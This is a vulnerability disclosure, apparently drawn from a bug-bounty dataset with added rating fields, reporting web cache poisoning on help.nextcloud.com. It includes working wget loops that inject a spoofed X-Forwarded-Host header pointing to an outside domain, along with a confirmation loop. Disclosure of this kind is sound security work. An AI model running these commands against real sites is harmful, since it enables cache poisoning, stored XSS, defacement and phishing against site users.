title: https://help.nextcloud.com::: Web cache poisoning attack
content:
Hi there,
I just found the website:
https://help.nextcloud.com
is infected with "Web cache poisoning"
Abuse this bug, Attacker can:
Poison your cache with HTTP header with XSS included. This attack may leads to Stored XSS
Poison your website contains malware url (cache poisoned by attacker), maybe the user's browser (like Firefox, Chrome) will block your website (https://help.nextcloud.com)
How to reproduce the issue:
In the 1st terminal, run command likes this:
$ while true; do wget "https://help.nextcloud.com/?qwKzzSR=649227948379" --header 'X-Forwarded-Host: cyberjutsu.io/#' -qO->/dev/null; echo "poisoning...";done
In the 2nd terminal, run command below for confirmation this attack is successful:
while true; do wget "https://help.nextcloud.com/?qwKzzSR=649227948379" -qO-|grep "cyberjutsu.io"; echo "ping my payload..." ;done
Finally, this link bellow: https://help.nextcloud.com/?qwKzzSR=649227948379 was infected with "Web Cache poisoning attack".
Please see the attached image for details.
Impact
Stored XSS attack, deface website ....
Cheers,
~g4mm4
Impact
Stored XSS attack, deface website, phishing for funs :)
steps: Run the command in the first terminal: `while true; do wget "https://help.nextcloud.com/?qwKzzSR=649227948379" --header 'X-Forwarded-Host: cyberjutsu.io/#' -qO->/dev/null; echo "poisoning...";done`
Run the command in the second terminal for confirmation: `while true; do wget "https://help.nextcloud.com/?qwKzzSR=649227948379" -qO-|grep "cyberjutsu.io"; echo "ping my payload..." ;done`
vuln_description: The vulnerability is a web cache poisoning attack where an attacker can poison the cache of the website (https://help.nextcloud.com) by injecting malicious HTTP headers (X-Forwarded-Host) containing XSS payloads or malware URLs. This can lead to stored XSS attacks, defacement, or phishing, and may cause browsers to block the site.
reason: The attack involves manipulating HTTP headers to poison the web cache, which is a straightforward technique once the vulnerability is known. The interaction between the HTTP headers and the cache mechanism is not particularly subtle or complex, and the attack does not require novel logic or deep understanding of the application's state.
